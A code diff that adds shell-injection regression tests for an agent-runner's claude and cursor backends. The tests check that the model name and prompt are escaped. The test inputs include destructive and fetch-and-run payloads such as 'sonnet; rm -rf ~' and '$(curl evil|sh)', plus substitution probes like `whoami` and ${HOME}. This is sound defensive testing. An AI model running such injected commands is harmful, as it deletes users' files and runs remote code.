@@ -96,6 +96,30 @@ describe('runIteration (sync) backend dispatch', () => {
     expect(firstArg).toContain(' --model sonnet');
   });
 
+  it('escapes a malicious --model value for claude (no shell injection)', () => {
+    runIteration({
+      agentPrompt: 'x',
+      backend: 'claude',
+      iteration: 1,
+      model: 'sonnet; rm -rf ~',
+    });
+    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
+    expect(firstArg).toContain(' --model "sonnet; rm -rf ~"');
+    expect(firstArg).not.toContain(' --model sonnet; rm');
+  });
+
+  it('escapes a malicious --model value for cursor (no shell injection)', () => {
+    runIteration({
+      agentPrompt: 'x',
+      backend: 'cursor',
+      iteration: 1,
+      model: '$(curl evil|sh)',
+    });
+    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
+    expect(firstArg).toContain(' --model "$(curl evil|sh)"');
+    expect(firstArg).not.toMatch(/--model \$\(curl evil\|sh\)(?!")/);
+  });
+
   it('passes -w worktree for cursor when configured', () => {
     runIteration({
       agentPrompt: 'x',
@@ -136,6 +160,39 @@ describe('runIteration (sync) backend dispatch', () => {
     );
     expect(firstArg).toContain('-w my-wt');
     expect(firstArg).not.toContain('--worktree-base');
+  });
+
+  it('neutralizes $(...) command substitution in the prompt (cursor)', () => {
+    runIteration({
+      agentPrompt: 'plan: $(curl evil|sh) done',
+      backend: 'cursor',
+      iteration: 1,
+    });
+    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
+    expect(firstArg).toContain('plan: \\$(curl evil|sh) done');
+    expect(firstArg).not.toContain('plan: $(curl evil|sh) done');
+  });
+
+  it('neutralizes backtick command substitution in the prompt (cursor)', () => {
+    runIteration({
+      agentPrompt: 'task `id` here',
+      backend: 'cursor',
+      iteration: 1,
+    });
+    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
+    expect(firstArg).toContain('task \\`id\\` here');
+    expect(firstArg).not.toContain('task `id` here');
+  });
+
+  it('neutralizes ${...} parameter expansion in the prompt (claude)', () => {
+    runIteration({
+      agentPrompt: 'leak ${HOME} now',
+      backend: 'claude',
+      iteration: 1,
+    });
+    const firstArg = vi.mocked(spawnSync).mock.calls[0]?.[0];
+    expect(firstArg).toContain('leak \\${HOME} now');
+    expect(firstArg).not.toContain('leak ${HOME} now');
   });
 });
 
@@ -212,5 +269,16 @@ describe('runIterationAsync backend dispatch', () => {
     });
     const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
     expect(firstArg).toContain('-w async-wt');
+  });
+
+  it('neutralizes $(...) and backticks in the async prompt', async () => {
+    await runIterationAsync({
+      agentPrompt: 'inject $(id) and `whoami`',
+      backend: 'cursor',
+      iteration: 1,
+    });
+    const firstArg = vi.mocked(spawn).mock.calls[0]?.[0];
+    expect(firstArg).toContain('inject \\$(id) and \\`whoami\\`');
+    expect(firstArg).not.toContain('inject $(id) and `whoami`');
   });
 });
